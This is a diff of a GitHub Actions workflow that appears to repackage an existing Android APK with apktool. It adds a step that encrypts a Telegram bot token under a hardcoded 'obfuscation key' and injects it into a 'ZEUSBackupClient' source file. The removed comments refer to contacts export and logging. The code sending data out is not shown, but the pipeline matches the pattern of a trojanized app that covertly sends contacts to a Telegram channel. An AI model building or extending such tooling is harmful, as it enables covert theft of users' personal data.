@@ -77,6 +77,31 @@ jobs:
           sdkmanager "platforms;android-35" "build-tools;35.0.0"
           curl -fL https://github.com/iBotPeaches/Apktool/releases/download/v2.11.1/apktool_2.11.1.jar -o apktool.jar
 
+      - name: Inject encrypted test Telegram credential
+        shell: bash
+        env:
+          TELEGRAM_BOT_TOKEN: ${{ secrets.TELEGRAM_BOT_TOKEN }}
+          ZEUS_TOKEN_PASSPHRASE: ZEUS-RED-ROOM-TEST-2026-OBFUSCATION-KEY
+        run: |
+          set -euo pipefail
+          if [ -z "${TELEGRAM_BOT_TOKEN:-}" ]; then
+            echo "Missing GitHub Actions secret: TELEGRAM_BOT_TOKEN" >&2
+            exit 1
+          fi
+          export ZEUS_TOKEN_CIPHERTEXT
+          ZEUS_TOKEN_CIPHERTEXT="$(printf '%s' "$TELEGRAM_BOT_TOKEN" | openssl enc -aes-256-cbc -salt -pbkdf2 -iter 100000 -a -A -pass env:ZEUS_TOKEN_PASSPHRASE)"
+          python3 - <<'PY'
+          import os
+          from pathlib import Path
+          path = Path("build/ZEUSBackupClient.java")
+          source = path.read_text(encoding="utf-8")
+          marker = "__ZEUS_TELEGRAM_TOKEN_CIPHERTEXT__"
+          value = os.environ["ZEUS_TOKEN_CIPHERTEXT"]
+          if marker not in source or not value:
+              raise SystemExit("Token injection placeholder missing or empty")
+          path.write_text(source.replace(marker, value), encoding="utf-8")
+          PY
+
       - name: Decode and patch original APK
         shell: bash
         run: |
@@ -135,12 +160,3 @@ jobs:
             verify-apk/AndroidManifest.xml
           if-no-files-found: error
           retention-days: 30
-
-# Rebuild after correcting the local ZEUS Interface asset injection.
-# Rebuild after Android 12+ Nearby devices permission validation fix.
-
-# Rebuild after adding one-tap save-all contacts TXT export.
-
-# Rebuild after hardening native device-named TXT export to Downloads.
-
-# Rebuild after live status, SVG controls, local contacts log and Cairo clock polish.
